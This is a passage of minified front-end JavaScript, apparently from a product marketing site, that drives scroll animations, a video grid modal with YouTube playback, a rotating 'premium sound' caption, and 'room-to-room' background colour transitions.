}dispose(){this.scrollToOnFocus&&this.scrollToOnFocus.dispose(),this.domWatcher.dispose(),this.ev.dispose()}},zx=Sm,Am=class{static get $inject(){return["$element","$scope"]}constructor(t,e){this.el=t[0],this.$scope=e,this.effects_=[],this.useWipeEffect_=this.el.attributes["mqn2-masked-hero-wipe-effect"]&&"true"===this.el.attributes["mqn2-masked-hero-wipe-effect"].value,this.destroyed_=!1,this.init(e)}init(t){this.initScrollEffects(),de.runScrollLoop(),t.$on("$destroy",(()=>{this.dispose()}))}initScrollEffects(){if(!this.useWipeEffect_)return;let t=this.getElement("masked-bg"),e=new jr(this.el,{startDistance:()=>-.5*window.innerHeight,endDistance:()=>this.el.offsetHeight,getDistanceFunction:ni.DISTANCE_FROM_DOCUMENT_TOP,effects:[new Yt([[0,"opacity: 0;"],[.333,"opacity: 1; transform: translateY(0);"],[.667,"opacity: 1;"],[1,"opacity: 0; transform: translateY(40vh);"]],{styleTarget:t})]});this.effects_.push(e)}getElement(t){return this.el.querySelector(`[data-element-id="${t}"]`)}dispose(){this.disposeScrollEffects_(),this.destroyed_=!0}disposeScrollEffects_(){this.effects_.forEach((t=>t.destroy())),this.effects_=[]}},Cm="width",Tm="0px",jx={QUERY_FADE_TIME:400,REQUEST_WORD_TIME:200},xm=class{constructor(t,e,i,r,n,s,o=!1){this.landscapeWidth_=t,this.landscapeHeight_=e,this.landscapeFilledHeight_=i,this.portraitWidth_=r,this.portraitHeight_=n,this.portraitFilledHeight_=s,this.isCoveredAndCentered_=o}getNativeHeight_(){return rt.isPortrait()?this.portraitHeight_:this.landscapeHeight_}getNativeWidth_(){return rt.isPortrait()?this.portraitWidth_:this.landscapeWidth_}getNativeFilledHeight_(){return rt.isPortrait()?this.portraitFilledHeight_:this.landscapeFilledHeight_}getCoverScaleFactor_(){return this.isCoveredAndCentered_?Math.max(window.innerWidth/this.getNativeWidth_(),window.innerHeight/this.getNativeHeight_()):window.innerWidth/this.getNativeWidth_()}getFilledHeight(){let t=this.getNativeFilledHeight_()*this.getCoverScaleFactor_();if(this.isCoveredAndCentered_){return t-.5*(this.getNativeHeight_()*this.getCoverScaleFactor_()-window.innerHeight)}return t}},Uq=new xm(2880,1522,422,640,1136,356,!0),Hq=new xm(2880,1098,428,640,552,304),Br={REQUEST_WORD:te.mqnCssName("mqn2-valens-ch__request__word"),QUERY:te.mqnCssName("mqn2-valens-ch__query"),QUERY_DIM_LIGHTS:te.mqnCssName("mqn2-valens-ch__query--dim-lights"),QUERY_TURN_ON_TV:te.mqnCssName("mqn2-valens-ch__query--turn-on-tv"),CHAPTERS:te.mqnCssName("mqn2-valens-ch__chapters"),BACKGROUND_DARK:te.mqnCssName("mqn2-background-image--valens-ch--dark"),BACKGROUND_TV_ON:te.mqnCssName("mqn2-background-image--valens-ch-tv--on"),CONTENT_FRAME:te.mqnCssName("mqn2-valens-ch__content-frame"),PLACEHOLDER:te.mqnCssName("mqn2-valens-ch__placeholder"),ACTIVE:te.mqnCssName("--active"),PAST:te.mqnCssName("--past")};function Yx(t){let e=Array.from(t.querySelectorAll(`.${Br.REQUEST_WORD}`)).length*jx.REQUEST_WORD_TIME;return jx.QUERY_FADE_TIME+e}var Xx=class{static get $inject(){return["$element","$scope"]}constructor(t,e){this.element_=t[0],this.rl_=de.getDestroyableInstance(),this.stf_=new an({element:this.element_,setTabIndex:!0,debug:!1,setAriaRole:"region",topProgressOffset:0,bottomProgressOffset:0}),this.requestWords_=Array.from(this.element_.querySelectorAll(`.${Br.REQUEST_WORD}`)),this.dimLightsQuery_=this.element_.querySelector(`.${Br.QUERY_DIM_LIGHTS}`),this.turnOnTvQuery_=this.element_.querySelector(`.${Br.QUERY_TURN_ON_TV}`),this.darkBackgrounds_=Array.from(this.element_.querySelectorAll(`.${Br.BACKGROUND_DARK}`)),this.turnedOnTvBackgrounds_=Array.from(this.element_.querySelectorAll(`.${Br.BACKGROUND_TV_ON}`)),this.contentPieces_=Array.from(this.element_.querySelectorAll(`.${Br.CONTENT_FRAME}`)),this.placeholders_=Array.from(this.element_.querySelectorAll(`.${Br.PLACEHOLDER}`)),this.placeholdersToContent_=new Map(Vt(this.placeholders_,this.contentPieces_)),this.tvOnPiece_=this.contentPieces_.find((t=>!!t.querySelector(`.${Br.QUERY_TURN_ON_TV}`))),this.darkPiece_=this.contentPieces_.find((t=>!!t.querySelector(`.${Br.QUERY_DIM_LIGHTS}`))),this.lastActivePiece_=null,this.isPastMapping_=Xe.usingFunction((()=>!1)),this.lastDark_=!1,this.lastTvOn_=!1,this.init_(),this.handleResizeListenerFn_=()=>this.handleResize_(),window.addEventListener("resize",this.handleResizeListenerFn_),e.$on("$destroy",(()=>this.dispose_()))}init_(){this.handleResize_(),this.renderLoop_(),this.scrollLoop_()}renderLoop_(){this.rl_.measure((()=>{this.rl_.cleanup((()=>this.renderLoop_())),this.renderWords_()}))}scrollLoop_(){this.rl_.scrollMeasure((()=>{this.rl_.scrollCleanup((()=>this.scrollLoop_())),this.markActiveContent_()}))}markActiveContent_(){let t=new Map,e=new Map;this.placeholders_.forEach((i=>{let r=Ir(i),n=this.placeholdersToContent_.get(i);t.set(n,r),e.set(Math.abs(r),n)}));let i=e.get(Math.min(...e.keys()));this.updateOnTvBg_(t.get(this.tvOnPiece_)<window.innerHeight/2),this.updateDarkBg_(t.get(this.darkPiece_)<window.innerHeight/2),i!==this.lastActivePiece_&&(this.contentPieces_.forEach((t=>{t===i?this.rl_.scrollMutate((()=>Fi(t,Br.ACTIVE))):t===this.lastActivePiece_&&this.rl_.scrollMutate((()=>Ni(t,Br.ACTIVE)))})),this.lastActivePiece_=i),this.contentPieces_.forEach((e=>{let i=t.get(e)<=window.innerHeight/2;i!==this.isPastMapping_.get(e)&&(this.rl_.scrollMutate((()=>{i?Fi(e,Br.PAST):Ni(e,Br.PAST)})),this.isPastMapping_.set(e,i))}))}handleResize_(){this.setupContentPadding_()}setupContentPadding_(){this.rl_.measure((()=>{let t=Hq.getFilledHeight(),e=Uq.getFilledHeight(),i=Array.from(this.element_.querySelectorAll(`.${Br.CONTENT_FRAME}`));this.rl_.mutate((()=>{i.forEach((i=>{Ie(i,"padding-top",`${t}px`),Ie(i,"padding-bottom",`${e}px`)}))}))}))}updateDarkBg_(t){if(t===this.lastDark_)return;let e=t?"1":"0",i=t?Yx(this.dimLightsQuery_):0;this.rl_.scrollMutate((()=>{this.darkBackgrounds_.forEach((t=>{Ie(t,"transition-delay",`${i}ms`),this.rl_.measure((()=>{this.rl_.mutate((()=>Ie(t,"opacity",e)))}))}))})),this.lastDark_=t}updateOnTvBg_(t){if(t===this.lastTvOn_)return;let e=t?"1":"0",i=t?Yx(this.turnOnTvQuery_):0;this.rl_.scrollMutate((()=>{this.turnedOnTvBackgrounds_.forEach((t=>{Ie(t,"transition-delay",`${i}ms`),this.rl_.measure((()=>{this.rl_.mutate((()=>Ie(t,"opacity",e)))}))}))})),this.lastTvOn_=t}renderWords_(){let t=[],e=[];this.requestWords_.forEach((i=>{let r=vt(i,"opacity"),n=vt(i,Cm);"0"===r&&n!==Tm?t.push(i):"0"!==r&&n===Tm&&e.push(i)})),this.rl_.mutate((()=>{t.forEach((t=>Ie(t,Cm,Tm))),e.forEach((t=>Ie(t,Cm,"")))}))}dispose_(){window.removeEventListener("resize",this.handleResizeListenerFn_),this.rl_.destroy(),this.stf_&&this.stf_.dispose()}},Qx=Xx,Kx=ye(Nt()),Zx=ye(Jt()),Jx=ye(pn()),Rs=ye(gt()),eI=class{static get $inject(){return["$element","$scope"]}constructor(t,e){this.element=t[0],this.rl_=de.getDestroyableInstance(),e.$on("$destroy",(()=>this.dispose_())),this.domWatcher=new Kx.DomWatcher,this.ev=Zx.elementVisibility.inview(this.element,{rootMargin:"100px"}),this.scrollToCenterOfScreenOnFocus=new Qn({element:this.element,debug:!1,setTabIndex:!0,setAriaRole:"region"}),this.soundwaveVideo=this.element.querySelector("[soundwave] video"),this.soundwaveVideoIsPlaying=!1,this.init()}init(){this.domWatcher.add({id:"resize",element:window,on:"smartResize",callback:Jx.func.debounce((()=>this.onResize()),300),eventOptions:{passive:!0}}),this.domWatcher.add({element:window,on:"scroll",callback:this.onScroll.bind(this),runWhen:()=>this.ev.state().ready&&this.ev.state().inview,eventOptions:{passive:!0}}),window.setTimeout((()=>{this.domWatcher.run("resize")}),100)}onResize(){this.rl_.measure((()=>{let t=this.element.querySelector('[data-device="1"]'),e=t.firstElementChild,i=t.offsetHeight,r=e.offsetWidth,n=e.offsetHeight;this.rl_.mutate((()=>{Rs.dom.setCssVariable(this.element,"--device-width",`${r}px`),Rs.dom.setCssVariable(this.element,"--device-height",`${n}px`),i>n?Rs.dom.setCssVariable(this.element,"--device-justify","flex-end"):Rs.dom.setCssVariable(this.element,"--device-justify","flex-start")}))})),window.setTimeout((()=>{this.rl_.measure((()=>{let t=this.element.querySelector('[data-layer="2"]'),e=this.element.querySelector('[data-device="2"]').firstElementChild.getBoundingClientRect().top-t.getBoundingClientRect().top;this.rl_.mutate((()=>{Rs.dom.setCssVariable(this.element,"--device-top",`${e}px`)}))}))}),100)}getProgress(){return Rs.dom.getElementScrolledPercent(this.element.querySelector("[elevator]"),.5*window.innerHeight,0)}onScroll(){this.progress=this.getProgress()}dispose_(){this.scrollToCenterOfScreenOnFocus&&this.scrollToCenterOfScreenOnFocus,this.rl_.destroy()}},tI=eI,rI=ye(Jt()),Wi=ye(gt()),iI=ye(Nt()),Im=ye(Ki()),Pm=class{static get $inject(){return["$rootScope","$element","$scope"]}constructor(t,e,i){this.$scope=i,this.$rootScope=t,this.$element=e,this.el=e[0],this.scrollInner=this.el.querySelector("[scroll-inner]"),this.ev=rI.elementVisibility.inview(this.el,{rootMargin:"100px"}),this.scrollToOnFocus=new an({element:this.scrollInner,debug:!1,setTabIndex:!0,setAriaRole:"region",top:0}),this.scrollToCenterOfScreenOnFocus=new Qn({element:this.el,debug:!1,setTabIndex:!0,setAriaRole:"region"}),this.xCssInterpolation=new Im.CssVarInterpolate(this.el,{interpolations:[{id:"--rotate-y",progress:[{from:0,to:1,start:"-5deg",end:"5deg"}]}]}),this.xRafProgress=new Wi.RafProgress((t=>{this.xCssInterpolation.update(t)})),this.xRafProgress.setCurrentProgress(.5),this.yCssInterpolation=new Im.CssVarInterpolate(this.el,{interpolations:[{id:"--rotate-x",progress:[{from:0,to:1,start:"5deg",end:"-5deg"}]}]}),this.yRafProgress=new Wi.RafProgress((t=>{this.yCssInterpolation.update(t)})),this.yRafProgress.setCurrentProgress(.5),this.domWatcher=new iI.DomWatcher,this.domWatcher.add({element:window,on:"mousemove",callback:Wi.func.debounce((t=>{this.onMouseMove(t)}),24),runWhen:()=>!this.isMobile()&&this.ev.state().ready&&this.ev.state().inview,eventOptions:{passive:!0},id:"mousemove"}),this.domWatcher.add({element:window,on:"smartResize",callback:Wi.func.debounce((()=>{this.onResize()}),300),eventOptions:{passive:!0}}),this.onResize(),i.$on("$destroy",(()=>this.dispose()))}onMouseMove(t){if(!t)return;let e=document.body.getBoundingClientRect(),i=t.pageX||t.clientX,r=(t.pageY||t.clientY)+e.top,n=i/window.innerWidth,s=r/window.innerHeight;this.xRafProgress.easeTo(n,.32,Wi.EASE.linear),this.yRafProgress.easeTo(s,.32,Wi.EASE.linear)}onResize(){let t=this.el.querySelector("[query-device]");if(t){let e=t.firstElementChild;t.offsetHeight>=e.offsetHeight?t.style.justifyContent="flex-end":t.style.justifyContent="flex-start"}this.isMobile()&&(this.xRafProgress.easeTo(.5,.32,Wi.EASE.linear),this.yRafProgress.easeTo(.5,.32,Wi.EASE.linear))}isMobile(){return window.innerWidth<=768}dispose(){this.scrollToOnFocus&&this.scrollToOnFocus.dispose(),this.scrollToCenterOfScreenOnFocus&&this.scrollToCenterOfScreenOnFocus.dispose(),this.ev.dispose(),this.domWatcher.dispose()}},nI=Pm;function Xu(t){t.parentNode.removeChild(t)}var Si={GRID:te.mqnCssName("mqn2-video-grid__grid"),ITEM:te.mqnCssName("mqn2-video-grid__item"),VIDEO_CONTAINER:te.mqnCssName("mqn2-video-grid__modal-video"),MODAL:te.mqnCssName("mqn2-video-grid__modal"),MODAL_OPENING:te.mqnCssName("mqn2-video-grid__modal--opening"),MODAL_OPEN:te.mqnCssName("mqn2-video-grid__modal--open"),MODAL_CLOSING:te.mqnCssName("mqn2-video-grid__modal--closing"),MODAL_CLOSED:te.mqnCssName("mqn2-video-grid__modal--closed")},Gq=4,zq=5,sI=class{constructor(t){this.items_=t,this.relatedItems_=new Set,this.displayedIndex_=0,this.generateRelatedItems_()}getItems(){return this.items_}getItemElements(){return this.items_.map((t=>t.element))}isRelatedItem(t){return this.relatedItems_.has(this.items_[t])}generateRelatedItems_(){let t=this.getDisplayedItem();this.relatedItems_.clear();for(let e=0;e<this.items_.length;e++){let i=this.items_[e];if(i!==t&&i.category===t.category&&(this.relatedItems_.add(i),this.relatedItems_.size>=Gq))break}}getDisplayedItem(){return this.items_[this.displayedIndex_]}getNextItem(){return this.items_[Xr(this.displayedIndex_+1,this.items_.length)]}getPrevItem(){return this.items_[Xr(this.displayedIndex_-1,this.items_.length)]}showItem(t){this.displayedIndex_=Xr(t,this.items_.length),this.generateRelatedItems_()}dispose(){this.items_=null,this.relatedItems_.clear(),this.relatedItems_=null}},oI=class extends Ao{static get $inject(){return["$rootScope","$element","$scope","$compile","$timeout","$window"]}constructor(t,e,i,r,n,s){super(t,e,i,r),this.$timeout=n,this.el_=e[0],this.lastY_=null,this.modalEl_=null;let o=Array.from(this.el_.querySelectorAll("[data-grid-item-index]")).map((t=>{let e=t.querySelector("[data-grid-item-category]"),i=t.querySelector("[data-grid-item-title]");return{element:t,category:e&&e.textContent.trim(),title:i&&i.textContent.trim()}}));this.grid_=new sI(o),this.gridEl_=this.el_.querySelector(`.${Si.GRID}`),this.lastMaxHeight_=null,this.displayedRows_=this.getInitialRowCount_(),this.resizeHandler_=()=>this.handleResize_(),this.window_=s,this.window_.addEventListener("resize",this.resizeHandler_),this.rl_=de.getDestroyableInstance(),this.currentItem=null,this.rl_.mutate((()=>Ie(this.gridEl_,"transition","none"))),this.render_(),i.$on("destroy",(()=>this.dispose_()))}render_(){this.rl_.measure((()=>{this.rl_.cleanup((()=>this.render_()));let t=this.getMaxHeight_();t!==this.lastMaxHeight_&&(this.adjustMaxHeight_(t),this.lastMaxHeight_=t)}))}init(t){super.init(t),this.gallery.on("afterChange",((t,e,i)=>{null!==this.currentItem&&this.showItem(i,!1)}))}handleResize_(){this.rl_.measure((()=>{this.displayedRows_=Math.max(this.displayedRows_,this.getInitialRowCount_())}))}getMaxHeight_(){let t=this.grid_.getItems().slice(0,this.getDisplayedItemCount_()),e=this.getItemCountPerRow_(),i=this.getDisplayedRowCount_(),r=t.slice((i-1)*e,i*e);return Math.max(...r.map((t=>t.element.offsetHeight)))+r[0].element.offsetTop}adjustMaxHeight_(t){this.rl_.measure((()=>{let e=`${t}px`,i=this.gridEl_.offsetHeight+zq,r=this.gridEl_.style.height;(!r&&i!==t||r&&r!==e)&&this.rl_.mutate((()=>Ie(this.gridEl_,"height",e)))}))}getDisplayedRowCount_(){return Math.ceil(this.getDisplayedItemCount_()/this.getItemCountPerRow_())}getItemCountPerRow_(){let t=this.grid_.getItemElements(),e=t[0].offsetTop;return t.filter((t=>t.offsetTop===e)).length}getDisplayedItemCount_(){return Math.min(this.displayedRows_*this.getItemCountPerRow_(),this.grid_.getItems().length)}moreCanBeShown(){return this.getDisplayedItemCount_()<this.grid_.getItems().length}hasMultipleRows(){return this.grid_.getItems().length>this.getInitialDisplayedItemCount_()}getInitialDisplayedItemCount_(){return this.getInitialRowCount_()*this.getItemCountPerRow_()}clearTransition_(){this.rl_.mutate((()=>Ie(this.gridEl_,"transition","")))}showExpandRows(){this.moreCanBeShown()?this.showMore():this.showLess()}showMore(){this.clearTransition_(),this.displayedRows_+=2}showLess(){this.clearTransition_(),this.displayedRows_=this.getInitialRowCount_()}getInitialRowCount_(){return window.innerWidth<461?3:2}showItem(t,e=!1){this.grid_.showItem(t),t>=0&&(this.gallery.slick("slickGoTo",t,e),this.grid_.getDisplayedItem()!==this.currentItem&&this.openModal()),this.currentItem=this.grid_.getDisplayedItem(),this.nextItem=this.grid_.getNextItem(),this.prevItem=this.grid_.getPrevItem(),this.disposePlayer_()}disposePlayer_(){this.player&&(this.player.destroy(),this.player=null)}playVideoInModal(t){window.MQN_YOUTUBEMODAL?window.MQN_YOUTUBEMODAL.play(t):console.error("youtube modal not initialized")}playVideo(t){let e=this.modalEl_.querySelector(`[data-grid-carousel-item-index="${t}"]`).querySelector("[data-youtube-id]"),i=e.getAttribute("data-youtube-id");this.player=new YT.Player(e,{videoId:i,events:{onReady:()=>this.player.playVideo()},playerVars:{autohide:1,autoplay:1,fs:1,modestbranding:1,rel:0,showinfo:0,iv_load_policy:3}})}isRelatedItem(t){return this.grid_.isRelatedItem(t)}openModal(){this.modalEl_&&(Xu(this.modalEl_),this.el.appendChild(this.modalEl_)),this.player&&this.player.pauseVideo(),this.scrollY=window.scrollY,"fixed"!==document.body.style.position&&(document.body.style.position="fixed",document.body.style.top=`-${this.scrollY}px`,document.body.style.paddingRight="0"),this.modalEl_=this.el.querySelector(`.${Si.MODAL}`),this.modalEl_.classList.remove(Si.MODAL_CLOSED),this.modalEl_.classList.remove(Si.MODAL_CLOSING),this.modalEl_.classList.add(Si.MODAL_OPENING),Xu(this.modalEl_),document.body.appendChild(this.modalEl_),this.$timeout((()=>{this.modalEl_.classList.remove(Si.MODAL_OPENING),this.modalEl_.classList.add(Si.MODAL_OPEN)}),100)}closeModal(){this.currentItem=null,document.body.style.position="",document.body.style.top="",document.body.style.paddingRight="",window.scrollTo(0,this.scrollY+100),this.$timeout((()=>{this.modalEl_.classList.add(Si.MODAL_CLOSING),this.modalEl_.classList.remove(Si.MODAL_OPEN),window.scrollTo(0,this.scrollY)}),200),this.$timeout((()=>{this.modalEl_.classList.add(Si.MODAL_CLOSED),this.modalEl_.classList.remove(Si.MODAL_CLOSING),this.modalEl_.classList.remove(Si.MODAL_OPENING),this.player&&this.player.pauseVideo()}),500)}dispose_(){this.modalEl_&&this.modalEl_.parentNode&&(Xu(this.modalEl_),this.el.appendChild(this.modalEl_)),super.dispose_(),this.rl_.destroy(),this.window_.removeEventListener("resize",this.resizeHandler_),this.disposePlayer_(),this.grid_.dispose()}},aI=oI,Ms={SUB:te.mqnCssName("mqn2-premium-sound__sub"),PREVIOUS:te.mqnCssName("mqn2-premium-sound__sub--previous"),ACTIVE:te.mqnCssName("mqn2-premium-sound__sub--active"),NEXT:te.mqnCssName("mqn2-premium-sound__sub--next")},jq=new Set([Ms.PREVIOUS,Ms.ACTIVE,Ms.NEXT]),lI=class{static get $inject(){return["$element","$scope"]}constructor(t,e){this.element_=t[0],this.rl_=de.getDestroyableInstance(),this.subs_=this.element_.querySelectorAll(`.${Ms.SUB}`),this.activeIndex_=0,this.activeTime_=parseInt(vt(this.element_,"--active-time")),this.wordTransitionTime_=parseInt(vt(this.element_,"--word-transition-time")),this.widthTransitionTime_=parseInt(vt(this.element_,"--width-transition-time")),this.updateTimeout_=null,this.widthTimeout_=null,this.transitionTimeout_=null,this.init_(e)}init_(t){t.$on("$destroy",(()=>this.dispose_())),this.rl_.measure((()=>{let t=this.element_.offsetWidth;this.rl_.mutate((()=>Ie(this.element_,"width",`${t}px`)))})),this.update_()}updateWidth_(t,e){let i=this.subs_[t].offsetWidth,r=this.subs_[e].offsetWidth,n=this.activeTime_-this.widthTransitionTime_,s=i<=r?n+.5*this.wordTransitionTime_:n+this.wordTransitionTime_,o=()=>{Ie(this.element_,"width",`${r}px`)};this.widthTimeout_=setTimeout((()=>this.rl_.mutate(o)),s)}update_(){this.rl_.measure((()=>{let t=this.activeIndex_;this.activeIndex_=Xr(this.activeIndex_+1,this.subs_.length);let e=Xr(this.activeIndex_+1,this.subs_.length);this.updateWidth_(t,this.activeIndex_),this.transitionTimeout_=setTimeout((()=>this.updateWords_(t,this.activeIndex_,e)),this.activeTime_);let i=this.activeTime_+this.wordTransitionTime_;this.updateTimeout_=setTimeout((()=>this.update_()),i)}))}updateWords_(t,e,i){this.rl_.mutate((()=>{this.subs_.forEach(((r,n)=>{let s=new Set;n===t&&s.add(Ms.PREVIOUS),n===e&&s.add(Ms.ACTIVE),n===i&&s.add(Ms.NEXT),Vr(Xn(jq,s).values(),(t=>r.classList.remove(t))),Vr(s.values(),(t=>r.classList.add(t)))}))}))}dispose_(){this.rl_.destroy(),clearTimeout(this.updateTimeout_),clearTimeout(this.widthTimeout_),clearTimeout(this.transitionTimeout_)}},cI=lI;function Yq(t){for(var e=t,i=0,r=0;e&&e!==document.body;){if("fixed"===vt(e,"position"))return new Je(i+e.offsetLeft,r+e.offsetTop);var n=Je.fromElementTransform(e);i+=e.offsetLeft+n.x-e.scrollLeft,r+=e.offsetTop+n.y-e.scrollTop,e=e.offsetParent}var s=_i.getSingleton(this),o=s.getPosition().invert();return s.destroy(this),new Je(i+o.x,r+o.y)}function uI(t){return"fixed"===vt(t,"position")?Je.fromElementOffset(t):Je.add(Je.fromElementOffset(t),Je.fromElementTransform(t),Yq(t.offsetParent))}var Xq=600,Om={CIRCLE:te.mqnCssName("mqn2-premium-sound__circle"),CIRCLE_TRANSLATE:te.mqnCssName("mqn2-premium-sound__circle-translate")},hI=class{static get $inject(){return["$element","$scope"]}constructor(t,e){this.rl_=de.getDestroyableInstance(),this.ease_=new si(.66,0,.06,.99),this.element_=t[0],this.lastUpdate_=+new Date,this.lastFrame_=this.lastUpdate_,this.lastPosition_=Zn,this.motionRange_=new Ae(0,Xq),this.circles_=this.element_.querySelectorAll(`.${Om.CIRCLE}`),this.startPositions_=Xe.usingFunction((t=>Je.fromElementTransform(t.querySelector(`.${Om.CIRCLE_TRANSLATE}`)))),this.cursor_=$u.getSingleton(this),this.init_(e)}init_(t){t.$on("$destroy",(()=>this.dispose_())),this.update_()}update_(){this.rl_.measure((()=>{this.rl_.cleanup((()=>this.update_()));let t=Ei(this.element_,"--final-circle-scale"),e=this.cursor_.getClient().getPosition(),i=!e.equals(this.lastPosition_),r=+new Date,n=i?r-this.lastFrame_:r-this.lastUpdate_;i&&(this.lastPosition_=e,this.lastUpdate_=this.lastFrame_,this.startPositions_.clear());let s=this.motionRange_.getValueAsPercent(n);this.circles_.forEach((i=>this.updateCircle_(i,e,t,s))),this.lastFrame_=r}))}updateCircle_(t,e,i,r){let n=t.offsetWidth/2,s=uI(t).add(new Je(n,n)),o=n*(1-i)*1.025,a=n,l=e.subtract(s).clampLength(a).scale(1/a).scale(o),h=this.startPositions_.get(t),c=l.subtract(h).scale(r),u=h.add(c),d=t.querySelector(`.${Om.CIRCLE_TRANSLATE}`);this.rl_.mutate((()=>{Ie(d,"transform",`translate(${u.getX()}px, ${u.getY()}px)`)}))}dispose_(){this.rl_.destroy(),this.cursor_.destroy(this)}},fI=hI;function dI(t,e){return void 0===e&&(e=null),Cn(Array.from(t),(function(t){return Math.abs(Yc(t,e))}))}var pI=ye(gt()),mI=ye(gt()),Qu=ye(Jl()),gI=ye(gt()),Qq=.5,Ai={HEADER:te.mqnCssName("mqn2-room-to-room__header"),ROOM:te.mqnCssName("mqn2-room-to-room__room"),ROOM_ACTIVE:te.mqnCssName("mqn2-room-to-room__room--active"),ROOM_END:te.mqnCssName("mqn2-room-to-room__room--end"),ROOM_SCROLLED:te.mqnCssName("mqn2-room-to-room__room--scrolled"),ROOM_TRANSITION:te.mqnCssName("mqn2-room-to-room__room--transition"),ROOM_TRANSITIONING:te.mqnCssName("mqn2-room-to-room__room--transitioning"),SCROLL_AREA:te.mqnCssName("mqn2-room-to-room__scroll-area"),SCROLL_AREA_ROOMS:te.mqnCssName("mqn2-room-to-room__rooms--scroll-area"),WIPE_BACKGROUND:te.mqnCssName("mqn2-room-to-room__background-scroll-area")},Rm=class{static get $inject(){return["$rootScope","$element","$scope"]}constructor(t,e,i){this.element_=e[0],this.rl_=de.getDestroyableInstance(),this.header_=this.element_.querySelector(`.${Ai.HEADER}`),this.scrollArea_=this.element_.querySelector(`.${Ai.SCROLL_AREA}`),this.scrolledRooms_=Array.from(this.element_.querySelectorAll(`.${Ai.ROOM_SCROLLED}`)),this.endRoom_=this.element_.querySelector(`.${Ai.ROOM_END}`),this.transitionRoom_=this.element_.querySelector(`.${Ai.ROOM_TRANSITION}`),this.wipeBackground_=this.element_.querySelector(`.${Ai.WIPE_BACKGROUND}`),this.scrolledRoom_=this.element_.querySelector(`.${Ai.SCROLL_AREA_ROOMS} .${Ai.ROOM}`),this.progressPerRoom_=1/(this.scrolledRooms_.length+1),this.roomProgressRanges_=Xe.usingFunction((t=>new Ae(t*this.progressPerRoom_,(t+1+Qq)*this.progressPerRoom_))),this.roomColors_=Xe.usingFunction((t=>t.getAttribute("data-background-color"))),this.rafProgress=new pI.RafProgress,this.rafProgress.setPrecision(5),this.rafProgress.watch(mI.func.runOnceOnChange(this.updateRafProgressValues_.bind(this))),this.lastActiveRoom_=null,this.lastWipeDistance_=null,this.offsetHeightCache_=new Map,this.init_(),i.$on("$destroy",(()=>this.dispose_()))}init_(){this.render_()}updateRafProgressValues_(t){this.rl_.mutate((()=>{Ie(this.element_,"--end-grid-transition-progress",`${t}`)}))}render_(){this.rl_.measure((()=>{this.rl_.cleanup((()=>this.render_())),this.updateWipeProgress_(),this.updateActiveRoom_(),this.updateHeaderHeight_(),this.updateLastRoomHeight_(),this.updateRoomsScrollAreaHeight_(),this.updateBackgroundColor_()}))}updateWipeProgress_(){this.rl_.measure((()=>{let t=jc(this.endRoom_,this.wipeBackground_);if(this.lastWipeDistance_===t)return;this.lastWipeDistance_=t;let e=new Ae(0,1).clamp(t/this.endRoom_.offsetHeight);this.rafProgress.easeTo(e,.08,gI.EASE.Linear),this.rl_.mutate((()=>{t>0?(Ie(this.element_,"--wipe-clip-distance",`${t}px`),this.transitionRoom_.classList.add(Ai.ROOM_TRANSITIONING)):(Ie(this.element_,"--wipe-clip-distance","0px"),this.transitionRoom_.classList.remove(Ai.ROOM_TRANSITIONING))}))}))}updateBackgroundColor_(){let t,e=Ei(this.wipeBackground_,"--color-progress");if(e>0){let i={r:255,g:255,b:255,a:1},r=i,n=i,s=0;for(let t=0;t<this.scrolledRooms_.length;t++){let i=this.roomProgressRanges_.get(t);if(e>0&&(i.contains(e)||t===this.scrolledRooms_.length-1&&e>=i.getMax())){t>0&&(r=Qu.color.cssToRgba(this.roomColors_.get(this.scrolledRooms_[t-1]))),s=i.getValueAsPercent(e),n=Qu.color.cssToRgba(this.roomColors_.get(this.scrolledRooms_[t]));break}}let o=1-s,a=Ae.fromUnorderedValues(r.r,n.r),l=Ae.fromUnorderedValues(r.g,n.g),h=Ae.fromUnorderedValues(r.b,n.b),c={r:r.r<n.r?a.getPercentAsValue(s):a.getPercentAsValue(o),g:r.g<n.g?l.getPercentAsValue(s):l.getPercentAsValue(o),b:r.b<n.b?h.getPercentAsValue(s):h.getPercentAsValue(o),a:1};t=Qu.color.rgbaToCss(c)}else t="white";this.rl_.mutate((()=>Ie(this.wipeBackground_,"background-color",t)))}updateActiveRoom_(){this.rl_.measure((()=>{let t=dI(this.scrolledRooms_);this.lastActiveRoom_!==t&&(this.lastActiveRoom_=t,this.rl_.mutate((()=>{t.classList.add(Ai.ROOM_ACTIVE),this.scrolledRooms_.filter((e=>e!==t)).forEach((t=>t.classList.remove(Ai.ROOM_ACTIVE)))})))}))}updateHeaderHeight_(){this.rl_.measure((()=>{let t=this.header_.offsetHeight;this.offsetHeightCache_.get(this.header_)!==t&&(this.offsetHeightCache_.set(this.header_,t),this.rl_.mutate((()=>{Ie(this.element_,"--r2r-header-height",`${t}px`)})))}))}updateRoomsScrollAreaHeight_(){this.rl_.measure((()=>{let t=this.scrollArea_.offsetHeight;this.offsetHeightCache_.get(this.scrollArea_)!==t&&(this.offsetHeightCache_.set(this.scrollArea_,t),this.rl_.mutate((()=>{Ie(this.element_,"--r2r-scroll-area-height",`${t}px`)})))}))}updateLastRoomHeight_(){this.rl_.measure((()=>{let t=this.scrolledRoom_.offsetHeight;this.offsetHeightCache_.get(this.scrolledRoom_)!==t&&(this.offsetHeightCache_.set(this.scrolledRoom_,t),this.rl_.mutate((()=>{Ie(this.element_,"--r2r-room-height",`${t}px`)})))}))}dispose_(){this.rl_.destroy()}},vI=Rm;function Uo(t,e,i){i?t.classList.add(e):t.classList.remove(e)}var yI=.1,Kq=new Ae(0,.5-yI/2),Zq=new Ae(.5+yI/2,1),Jq=new Ae(.975,1),eB=.5,tB=new si(.45,0,.55,1),Lr={ROOM_ACTIVE:te.mqnCssName("mqn2-room-to-room__room--active"),ELEVATOR:te.mqnCssName("mqn2-room-to-room__elevator"),CAROUSEL:te.mqnCssName("mqn2-room-to-room__carousel"),CAROUSEL_ACTIVE:te.mqnCssName("mqn2-room-to-room__carousel--active"),CAROUSEL_VISIBLE:te.mqnCssName("mqn2-room-to-room__carousel--visible"),END_VIDEO:te.mqnCssName("mqn2-room-to-room__end-video"),SCROLL_AREA:te.mqnCssName("mqn2-room-to-room__scroll-area"),SCROLL_AREA_INACTIVE:te.mqnCssName("mqn2-room-to-room__scroll-area--inactive"),ROOM:te.mqnCssName("mqn2-room-to-room__room"),CURTAIN:te.mqnCssName("mqn2-room-to-room__curtain"),END_VIDEO_LOCKED:te.mqnCssName("mqn2-room-to-room__end-video--locked"),CAROUSEL_CONTAINER:te.mqnCssName("mqn2-room-to-room__carousel-container"),CAROUSEL_SCROLLER:te.mqnCssName("mqn2-room-to-room__scroller")},Mm=class{static get 